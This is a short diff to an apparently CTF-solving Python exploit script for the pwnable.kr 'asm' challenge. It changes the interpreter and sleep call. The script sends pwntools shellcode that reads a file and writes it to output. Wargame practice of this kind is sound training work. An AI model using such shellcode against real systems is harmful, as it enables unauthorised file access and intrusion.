@@ -1,6 +1,5 @@
-#!/usr/bin/python3
+#!/usr/bin/python2
 from pwn import *
-import time
 context(arch = 'amd64', os = 'linux')
 
 print('Connecting to asm@pwnable.kr:2222.......')
@@ -14,5 +13,5 @@ shellcode += shellcraft.read('rax', 'rsp', 100)
 shellcode += shellcraft.write(1, 'rsp', 100) + '\n'
 
 p.send(asm(shellcode))
-time.sleep(1)
+sleep(1)
 print(p.recvline())
